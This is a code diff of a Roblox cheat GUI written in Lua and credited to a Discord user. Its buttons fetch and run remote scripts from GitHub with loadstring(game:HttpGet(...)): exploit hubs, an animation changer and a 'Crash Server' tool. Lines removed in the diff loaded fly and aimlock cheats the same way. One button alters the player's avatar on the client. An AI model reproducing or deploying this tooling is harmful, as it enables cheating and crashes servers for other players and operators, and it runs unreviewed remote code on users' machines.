@@ -1,4 +1,4 @@
--- lol
+-- By Призрак Киева#0001
 
 -- Instances:
 
@@ -9,15 +9,22 @@ local UICorner = Instance.new("UICorner")
 local TextLabel = Instance.new("TextLabel")
 local UICorner_2 = Instance.new("UICorner")
 local main_2 = Instance.new("Frame")
-local Player = Instance.new("TextButton")
-local AimLock = Instance.new("TextButton")
-local Other = Instance.new("TextButton")
 local TextLabel_2 = Instance.new("TextLabel")
 local TextLabel_3 = Instance.new("TextLabel")
+local TextLabel_4 = Instance.new("TextLabel")
+local TextLabel_5 = Instance.new("TextLabel")
+local TextButton = Instance.new("TextButton")
+local Dimag = Instance.new("TextButton")
+local Faded = Instance.new("TextButton")
+local Korblox = Instance.new("TextButton")
+local Changer = Instance.new("TextButton")
+local Server = Instance.new("TextButton")
+local RayCode = Instance.new("TextButton")
 
 --Properties:
 
 ScreenGui.Parent = game.CoreGui
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
 main.Name = "main"
 main.Parent = ScreenGui
@@ -54,61 +61,174 @@ main_2.BorderColor3 = Color3.fromRGB(255, 0, 4)
 main_2.Position = UDim2.new(0, 0, 0.130909085, 0)
 main_2.Size = UDim2.new(0, 115, 0, 239)
 
-Player.Name = "Player"
-Player.Parent = main_2
-Player.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Player.BackgroundTransparency = 1.000
-Player.Size = UDim2.new(0, 102, 0, 50)
-Player.Font = Enum.Font.GothamBold
-Player.Text = "Fly"
-Player.TextColor3 = Color3.fromRGB(0, 0, 0)
-Player.TextSize = 14.000
-Player.MouseButton1Down:connect(function()
-	loadstring(game:HttpGet('https://raw.githubusercontent.com/ezmicupballs/fly-lol/main/fly', true))()
-end)
+TextLabel_2.Parent = main_2
+TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_2.BackgroundTransparency = 1.000
+TextLabel_2.Size = UDim2.new(0, 115, 0, 50)
+TextLabel_2.Font = Enum.Font.SourceSans
+TextLabel_2.Text = "Credits:"
+TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_2.TextSize = 25.000
 
-AimLock.Name = "Aim Lock"
-AimLock.Parent = main_2
-AimLock.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-AimLock.BackgroundTransparency = 1.000
-AimLock.Position = UDim2.new(0.0521739125, 0, 0.238493711, 0)
-AimLock.Size = UDim2.new(0, 102, 0, 50)
-AimLock.Font = Enum.Font.GothamBold
-AimLock.Text = "Aim Lock"
-AimLock.TextColor3 = Color3.fromRGB(0, 0, 0)
-AimLock.TextSize = 14.000
-AimLock.MouseButton1Down:connect(function()
-	loadstring(game:HttpGet('https://raw.githubusercontent.com/ezmicupballs/aimlock/main/lock', true))()
-end)
+TextLabel_3.Parent = main_2
+TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_3.BackgroundTransparency = 1.000
+TextLabel_3.Position = UDim2.new(0, 0, 0.209205016, 0)
+TextLabel_3.Size = UDim2.new(0, 115, 0, 50)
+TextLabel_3.Font = Enum.Font.SourceSans
+TextLabel_3.Text = "Gui Made by Призрак Киева#0001"
+TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_3.TextScaled = true
+TextLabel_3.TextSize = 14.000
+TextLabel_3.TextWrapped = true
 
-Other.Name = "Other"
-Other.Parent = main_2
-Other.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Other.BackgroundTransparency = 1.000
-Other.Position = UDim2.new(0.0521739125, 0, 0.481171519, 0)
-Other.Size = UDim2.new(0, 102, 0, 50)
-Other.Font = Enum.Font.GothamBold
-Other.Text = "Other"
-Other.TextColor3 = Color3.fromRGB(0, 0, 0)
-Other.TextSize = 14.000
-Other.MouseButton1Down:connect(function()
+TextLabel_4.Parent = main_2
+TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_4.BackgroundTransparency = 1.000
+TextLabel_4.Position = UDim2.new(0, 0, 0.418410033, 0)
+TextLabel_4.Size = UDim2.new(0, 115, 0, 50)
+TextLabel_4.Font = Enum.Font.SourceSans
+TextLabel_4.Text = "Scripted By Призрак Киева#0001"
+TextLabel_4.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_4.TextScaled = true
+TextLabel_4.TextSize = 14.000
+TextLabel_4.TextWrapped = true
+
+TextLabel_5.Parent = main_2
+TextLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_5.BackgroundTransparency = 1.000
+TextLabel_5.Position = UDim2.new(0, 0, 0.627615035, 0)
+TextLabel_5.Size = UDim2.new(0, 115, 0, 50)
+TextLabel_5.Font = Enum.Font.SourceSans
+TextLabel_5.Text = "Scripts by Dimag 16 Ect"
+TextLabel_5.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_5.TextScaled = true
+TextLabel_5.TextSize = 14.000
+TextLabel_5.TextWrapped = true
+
+TextButton.Parent = main
+TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextButton.BackgroundTransparency = 1.000
+TextButton.Position = UDim2.new(0.877846718, 0, 0, 0)
+TextButton.Size = UDim2.new(0, 71, 0, 36)
+TextButton.Font = Enum.Font.SourceSans
+TextButton.Text = "X"
+TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton.TextSize = 21.000
+
+Dimag.Name = "Dimag"
+Dimag.Parent = main
+Dimag.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Dimag.BackgroundTransparency = 1.000
+Dimag.Position = UDim2.new(0.258799165, 0, 0.170909092, 0)
+Dimag.Size = UDim2.new(0, 103, 0, 50)
+Dimag.Font = Enum.Font.SourceSans
+Dimag.Text = "Dimag X"
+Dimag.TextColor3 = Color3.fromRGB(255, 255, 255)
+Dimag.TextSize = 14.000
+Dimag.MouseButton1Down:connect(function()
 	loadstring(game:HttpGet('https://raw.githubusercontent.com/Dimag16/DimagX_NEW/main/dimagx', true))()
 end)
 
-TextLabel_2.Parent = main
-TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel_2.Position = UDim2.new(0.399585932, 0, 0.261818171, 0)
-TextLabel_2.Size = UDim2.new(0, 200, 0, 50)
-TextLabel_2.Font = Enum.Font.SourceSans
-TextLabel_2.Text = "more coming soon"
-TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
-TextLabel_2.TextSize = 14.000
+Faded.Name = "Faded"
+Faded.Parent = main
+Faded.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Faded.BackgroundTransparency = 1.000
+Faded.Position = UDim2.new(0.258799165, 0, 0.443636358, 0)
+Faded.Size = UDim2.new(0, 103, 0, 50)
+Faded.Font = Enum.Font.SourceSans
+Faded.Text = "Faded"
+Faded.TextColor3 = Color3.fromRGB(255, 255, 255)
+Faded.TextSize = 14.000
+Faded.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/nighter132/Faded/main/YesEpic", true))() 
+end)
 
-TextLabel_3.Parent = main
-TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel_3.Position = UDim2.new(0.399585932, 0, 0.574545443, 0)
-TextLabel_3.Size = UDim2.new(0, 200, 0, 50)
-TextLabel_3.Font = Enum.Font.SourceSans
-TextLabel_3.Text = "Made by Призрак Киева#0001"
-TextLabel_3.TextColor3 = Color3.fromRGB(0, 0, 0)
-TextLabel_3.TextSize = 14.000
+Korblox.Name = "Korblox"
+Korblox.Parent = main
+Korblox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Korblox.BackgroundTransparency = 1.000
+Korblox.BorderColor3 = Color3.fromRGB(255, 0, 4)
+Korblox.Position = UDim2.new(0.27743271, 0, 0.727272749, 0)
+Korblox.Size = UDim2.new(0, 103, 0, 50)
+Korblox.Font = Enum.Font.SourceSans
+Korblox.Text = "Korblox & Headless(Client)"
+Korblox.TextColor3 = Color3.fromRGB(255, 255, 255)
+Korblox.TextScaled = true
+Korblox.TextSize = 14.000
+Korblox.TextWrapped = true
+Korblox.MouseButton1Down:connect(function()
+	game.Players.LocalPlayer.Character.Head.Transparency = 1
+	game.Players.LocalPlayer.Character.Head.Transparency = 1
+	for i,v in pairs(game.Players.LocalPlayer.Character.Head:GetChildren()) do
+		if (v:IsA("Decal")) then
+			v.Transparency = 1
+		end
+	end
+
+	local ply = game.Players.LocalPlayer
+	local chr = ply.Character
+	chr.RightLowerLeg.MeshId = "902942093"
+	chr.RightLowerLeg.Transparency = "1"
+	chr.RightUpperLeg.MeshId = "http://www.roblox.com/asset/?id=902942096"
+	chr.RightUpperLeg.TextureID = "http://roblox.com/asset/?id=902843398"
+	chr.RightFoot.MeshId = "902942089"
+	chr.RightFoot.Transparency = "1"
+end)
+
+Changer.Name = "Changer"
+Changer.Parent = main
+Changer.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Changer.BackgroundTransparency = 1.000
+Changer.Position = UDim2.new(0.536231875, 0, 0.170909092, 0)
+Changer.Size = UDim2.new(0, 124, 0, 50)
+Changer.Font = Enum.Font.SourceSans
+Changer.Text = "Animation Changer (FE)"
+Changer.TextColor3 = Color3.fromRGB(255, 255, 255)
+Changer.TextSize = 14.000
+Changer.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/HogRider123/Animation-Changer-Pro/main/Loader%20Cus%20Epik%20Pro", true))() 
+end)
+
+Server.Name = "Server"
+Server.Parent = main
+Server.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Server.BackgroundTransparency = 1.000
+Server.Position = UDim2.new(0.536231875, 0, 0.407272726, 0)
+Server.Size = UDim2.new(0, 124, 0, 50)
+Server.Font = Enum.Font.SourceSans
+Server.Text = "Crash Server"
+Server.TextColor3 = Color3.fromRGB(255, 255, 255)
+Server.TextSize = 14.000
+Server.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
+end)
+
+RayCode.Name = "RayCode"
+RayCode.Parent = main
+RayCode.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+RayCode.BackgroundTransparency = 1.000
+RayCode.Position = UDim2.new(0.550724626, 0, 0.727272749, 0)
+RayCode.Size = UDim2.new(0, 117, 0, 50)
+RayCode.Font = Enum.Font.SourceSans
+RayCode.Text = "RayCodeX"
+RayCode.TextColor3 = Color3.fromRGB(255, 255, 255)
+RayCode.TextSize = 14.000
+RayCode.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/Dimag16/DimagX_NEW/main/dimagx', true))()
+end)
+
+-- Scripts:
+
+local function HUAUOTJ_fake_script() -- TextButton.LocalScript 
+	local script = Instance.new('LocalScript', TextButton)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Visible = false
+	end)
+	
+	
+	
+	
+end
+coroutine.wrap(HUAUOTJ_fake_script)()
